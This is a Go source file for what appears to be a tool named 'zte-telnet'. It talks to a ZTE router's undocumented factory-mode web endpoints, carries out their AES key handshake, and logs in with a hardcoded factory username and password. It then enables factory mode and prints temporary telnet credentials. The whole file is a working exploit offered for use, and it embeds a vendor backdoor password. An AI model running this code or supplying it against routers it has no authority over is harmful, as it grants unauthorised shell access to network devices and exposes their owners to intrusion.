package main

import (
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"zte-telnet/internal/pwn"
)

type Options struct {
	Addr     string
	Port     string
	Username string
	Password string
	MAC      string
	SlaveIP  string
}

var opt Options

func (o Options) BaseURL() string {
	return "http://" + o.Addr + ":" + o.Port
}

func (o Options) RefererURL() string {
	return "http://" + o.Addr + "/login.html"
}

func post(path string, data []byte, referer string) ([]byte, error) {
	c := http.DefaultClient
	base := opt.BaseURL()
	
	req, err := http.NewRequest(http.MethodPost, base+path, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "text/plain")
	if referer != "" {
		req.Header.Set("Referer", referer)
	}

	r, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	defer r.Body.Close()

	var body []byte
	if r.Body != nil {
		body, err = io.ReadAll(r.Body)
	}
	if err == io.EOF {
		err = nil
	}

	if r.StatusCode != 200 {
		return nil, fmt.Errorf("http code err %d", r.StatusCode)
	}
	return body, err
}
// PKCS7填充
func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	if padding > 0 {
		for i := 0; i < padding; i++ {
			data = append(data, 0)
		}
	}
	return data
}

func openTelnet(pcMac []byte) error {
	referer := opt.RefererURL()
	clientRand := uint32(rand.Intn(59) + 1)
	_, _ = post("/webFac", []byte("SendSq.gch"), referer)
	_, _ = post("/webFac", []byte("RequestFactoryMode.gch"), referer)
	randReq := fmt.Sprintf("SendSq.gch?rand=%d\r\n", clientRand)
	body, err := post("/webFac", []byte(randReq), "")
	if err != nil {
		return err
	}
	str := string(body)
	if !strings.HasPrefix(str, "re_rand=") {
		return errors.New("rsp body err")
	}

	items := strings.Split(str[len("re_rand="):], "&")

	if len(items) < 3 {
		return errors.New("body content err")
	}
	re_rand, err := strconv.Atoi(items[0])
	if err != nil {
		return errors.New("re_rand err")
	}
	seed, err := strconv.Atoi(items[1])
	
	if err != nil {
		return errors.New("seed err")
	}
	
	mac := str[len(str)-6:]

	client_rand_mix := uint32(0x1000193) * clientRand
	client_rand_mask := client_rand_mix & uint32(0x8000003F)

	client_xor_server := client_rand_mask ^ uint32(re_rand)
	aes_index := client_xor_server % 60
	
	aes := pwn.GenerateAesKey(int(aes_index))

	payload_arr := pwn.CreatePayloadArray(uint32(seed), []byte(mac), pcMac, int(aes_index))
	
	value := pwn.BuildPayloadString(payload_arr)
	payloadBytes := pkcs7Pad([]byte(value), aes.BlockSize())

	dist, err := pwn.EncryptAES(aes, payloadBytes)
	if err != nil {
		return err
	}

	_ = dist
	_, err = post("/webFacEntry", dist, "")
	if err != nil {
		return err
	}
	py := []byte(fmt.Sprintf("CheckLoginAuth.gch?version50&user=%s&pass=%s", opt.Username, opt.Password))
	py, _ = pwn.EncryptAES(aes, py)
	body, err = post("/webFacEntry", py, "")
	if err != nil {
		return err
	}
	body, err = pwn.DecryptAES(aes, body)
	if err != nil {
		return err
	}
	if string(body) != "FactoryMode.gch" {
		return errors.New("expected result to match 'FactoryMode.gch")
	}
	plain_text := "FactoryMode.gch?mode=2&user=ksajdfiwp" 
	if opt.SlaveIP != "" {
		plain_text += "&slaveip=" + opt.SlaveIP
	}
	py = []byte(plain_text)
		
	py, _ = pwn.EncryptAES(aes, py)
	body, err = post("/webFacEntry", py, "")

	if err != nil {
		return err
	}
	body, err = pwn.DecryptAES(aes, body)
	str = string(body)
	/*log.Println("body", str)*/

	idx := strings.IndexByte(str, '?')
	if idx > 0 {
		q, err := url.ParseQuery(str[idx+1:])
		if err != nil {
			return err
		}
		usr := q.Get("user")
		pwd := q.Get("pass")

		fmt.Printf("Temporary Telnet Credentials:\n\nusername: %s\npassword: %s\n\nHave Fun!\n\n", usr, pwd)
	}
	return err
}
func parseMac(s string) ([]byte, error) {
	if s == "" {
		return nil, errors.New("Empty client mac address!")
	}
	return pwn.ParseMac(s)
}
func main() {
	flag.StringVar(&opt.Addr, "i", "192.168.1.1", "ZTE router IP address")
	flag.StringVar(&opt.Port, "p", "", "ZTE router Web Server binding Port")
	flag.StringVar(&opt.Username, "u", "factorymode", "ZTE router username. To enable the default username, please push reset button for 15 seconds to perform a hard reset")
	flag.StringVar(&opt.Password, "psd", "nE%jA@5b", "ZTE router password. To enable the default password, please push reset button for 15 seconds to perform a hard reset")
	flag.StringVar(&opt.MAC, "m", "", "your pc mac address")
	flag.StringVar(&opt.SlaveIP, "s", "", "slave Gateway IP address, only available for FTTR PON devices.")
	
	flag.Parse()
	//rand.Seed(time.Now().UnixNano())
	if flag.NFlag() == 0 {
		flag.Usage()
		os.Exit(0)
	}
	pcMac, err := parseMac(opt.MAC)
	if err != nil {
		flag.Usage()
		fmt.Printf("Error: %v\n", err)
	}

	err = openTelnet(pcMac)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
	}

}
